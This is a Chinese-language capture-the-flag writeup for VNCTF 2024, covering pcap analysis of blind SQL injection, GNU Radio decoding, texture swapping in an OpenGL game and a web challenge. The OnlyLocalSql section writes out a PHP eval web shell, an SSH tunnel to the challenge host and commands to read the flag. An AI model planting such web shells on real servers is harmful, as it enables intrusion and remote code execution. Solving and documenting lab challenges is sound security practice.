---
title: '2024 VNCTF Writeup'
description: '生成两张透明图片替代资源中的砖块图像'
pubDate: 2024-04-05
author: 'IHK-1'
tags: ['CTF', 'VNCTF', '2024']
---

# sqlshark
```python
# 过滤出sql语句
# tshark.exe -r sqlshark.pcap -T fields -e urlencoded-form.value -Y 'http' >out

import re

data = open(r"out", encoding='utf-16').read()
data = re.findall('(\d*) fOr 1\)\)\)\)in\((\d*)\)\)', data)

flag = [0] * 15
for item in data:
    num = int(item[0])
    value = int(item[1])
    flag[num] = value

print(''.join(map(chr,flag)))

# admin_p@ssw0rd
# VNCTF{admin_p@ssw0rd}
```

# ez_msb
[solve.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/35229002/1708144189842-f8495779-1a59-4fb5-87dc-dfc8a43c604f.zip)

<!-- 这是一张图片，ocr 内容为：OPTIONS VARIABLE TTLE:NAT TIDED YET ID:SAMP RATE OUTPUT LANGUAGE:PYTHON VALUE:32K GENERATE OPTIONS:NO GUI RUN OPTIONS: PROMPT FOR EXIT FILE SINK UNPACKED TO PACKED WAV FILE SOURCE FILE:...KICPLEZ_MSB(FLAG.TXT MULTIPLY CONST MULTIPLY CONST FLOAT TO CHAR FILE:..SKTCPLEZ.MSB`CUT.WAV OUT BITS PER CHUNLC 2 OUT OUT UNBUFFERED:CFF CONSTANT: 1K SCALE:1 CONSTANT:500M ENDIANNESS;MSB REPEAT: YES APPEND FILE OVERVARITE -->


<!-- 这是一张图片，ocr 内容为：文件()  搜索(S)视图 工具O 脚本@ 视图() 帮助(H) 格式(O) 窗口W 调试(D) 模板(L) HEX  起始页 FLAG.TXT X LEARNOPENGL.EXE VNCTFIGNURADIO-BEST RADIO 3DEBBJVNCTFIGNURADIO BEST RADIO-3DESB/YNCTF(GNURADIO-BEST.RA -ANURADIO BEST RADIO 3DERB;VNGTELGNURADIO BEST RADIO 3DESBYNGTFI8NURADIO BEST RADIO- RADIO 3G -IO BEST RADIO 3DERB;VICTFIGNURADIO BEST RADIO 3DESBYVNCTFIGNURADIO BEST RADIO-3DESBIVN :TLFADIO-3DESB)VNGTELANURADIO BEST RADIO 3DEAB/YNGTE(GNURADIO BEST .RAD10 3DE3B>YNCTF(8N -03DE8 -->


```plain
VNCTF{gnuradio_best_radio_3de8b}
```

# LearnOpenGL
生成两张透明图片替代资源中的砖块图像

```python
from PIL import Image

img = Image.new('RGBA', (128, 128), (0, 0, 0, 0))
img.save('out.png')
```

<!-- 这是一张图片，ocr 内容为：在 TEXTURES  中搜索 LEARNOPENGL RESOURCES > TEXTURES 查看 预览 仆排序 BLOCK_SOLID.PNG BALL.PNG BLOCKPNG BACKGROUND.PN POWERUP CHAOS PADDLE.PNG PARTICLE.PNG PNG G POWERUP_STICKY. POWERUP PASST POWERUP_SPEE POWERUP CONFU POWERUP INCREA HROUGH.PNG D.PNG SEPNG SEPNG PNG -->


<!-- 这是一张图片，ocr 内容为：VNCTF2024 LIVES:3 T VN 45T XT' R3 V_ SHOU 940 8703D0CCFEF0 PRESS ENTER TO START -->


```plain
VNCTF{T3xtur3_M45t3r_0r_r3v_g405hou_8703d0ccfef0}
```

# OnlyLocalSql
```plain
# 写入shell
echo '<?php eval($_POST[abc123]) ?>' >shell.php

# 开启远程代理
ssh -L 5555:127.0.0.1:80 ctf@manqiu.top -p 20657

# 蚁剑连接
localhost:5555 
cd ../../../ && cat flag

vnctf{00812b25-a3c2-4af8-8607-b9aede1960f2}
```

